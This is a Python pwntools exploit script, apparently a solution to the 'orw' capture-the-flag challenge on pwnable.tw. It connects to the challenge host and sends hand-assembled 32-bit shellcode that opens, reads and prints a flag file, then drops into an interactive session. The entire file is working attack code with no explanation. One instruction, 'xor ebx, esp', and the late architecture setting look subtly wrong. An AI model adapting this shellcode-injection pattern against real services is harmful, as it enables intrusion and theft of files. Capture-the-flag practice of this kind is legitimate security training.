# Exploit for orw
# swNotJoao
# i386 btw 32-bit binary

from pwn import *

remoteTarget = remote('chall.pwnable.tw', 10001)

shellcode = asm('\n'.join([
    'push %d' % u32('ag\0\0'),
    'push %d' % u32('w/fl'),
    'push %d' % u32('e/or'),
    'push %d' % u32('/hom'),

    'mov eax, 0x5',
    'xor ebx, esp',
    'xor ecx, ecx',
    'xor edx, edx',
    'int 0x80',

    'mov ebx, eax',
    'mov eax, 0x3',
    'mov ecx, 0x804a060',
    'add ecx, 0xa0',
    'mov edx, 0x28',
    'int 0x80',

    'mov eax, 0x4',
    'mov ebx, 0x1',
    'mov ecx, 0x804a060',
    'add ecx, 0xa0',
    'mov edx, 0x28',
    'int 0x80'
]))

context.arch = 'i386'
payload = shellcode
remoteTarget.send(payload)
remoteTarget.interactive()
